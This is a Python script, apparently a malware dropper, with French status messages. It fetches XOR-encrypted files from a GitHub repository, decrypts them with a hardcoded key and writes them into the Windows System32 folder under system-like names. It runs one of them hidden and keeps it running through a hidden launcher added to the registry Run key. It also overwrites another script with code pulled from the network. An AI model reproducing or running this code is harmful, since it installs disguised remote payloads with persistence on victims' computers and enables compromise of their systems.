import os
import sys
import shutil
import winreg
import tempfile
import requests
import subprocess

CLE = "LUCORACORE987"
URLS = {
    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
}

SYSTEM32 = r"C:\Windows\System32"
LAUNCHER_NAME = "winlauncher_hidden.py"
RUN_KEY_NAME = "WinLauncherHidden"
RAW_SCRIPT_REPLACEMENT = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"

def decrypt(content: bytes, key: str) -> str:
    key_bytes = key.encode()
    key_len = len(key_bytes)
    decrypted = bytearray()
    for i, b in enumerate(content):
        decrypted.append(b ^ key_bytes[i % key_len])
    return decrypted.decode(errors='ignore')

def write_file(path, content):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def download_and_install():
    paths = {}
    for filename_enc, url in URLS.items():
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        decrypted = decrypt(response.content, CLE)
        target_path = os.path.join(SYSTEM32, filename_enc[:-4])
        write_file(target_path, decrypted)
        print(f"[✓] Script installé : {target_path}")
        paths[filename_enc[:-4]] = target_path
    return paths

def run_systemruntime32_immediately(path):
    print(f"[i] Lancement immédiat de {path} en arrière-plan.")
    subprocess.Popen(['pythonw.exe', path], close_fds=True)

def create_launcher():
    launcher_code = f"""
import subprocess
import os
subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')])
"""
    launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
    write_file(launcher_path, launcher_code)
    return launcher_path

def add_to_startup(py_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f"pythonw.exe \"{py_path}\"")
    print("[✓] Script ajouté au démarrage.")

def remplacer_script_depuis_s_path():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")

    print(f"[i] Recherche d'un chemin de script à remplacer dans : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Aucun fichier s_path.txt trouvé.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        r = requests.get(RAW_SCRIPT_REPLACEMENT, timeout=10)
        r.raise_for_status()
        if r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script remplacé avec succès : {chemin_script}")
    except Exception as e:
        print(f"[!] Erreur lors du remplacement : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur suppression : {e}")

def main():
    if not os.access(SYSTEM32, os.W_OK):
        print("[!] Ce script doit être exécuté avec des droits administrateur.")
        return

    paths = download_and_install()

    # Lancer SystemRuntime32.py immédiatement
    if 'SystemRuntime32.py' in paths:
        run_systemruntime32_immediately(paths['SystemRuntime32.py'])

    launcher_path = create_launcher()
    add_to_startup(launcher_path)
    remplacer_script_depuis_s_path()

if __name__ == "__main__":
    main()
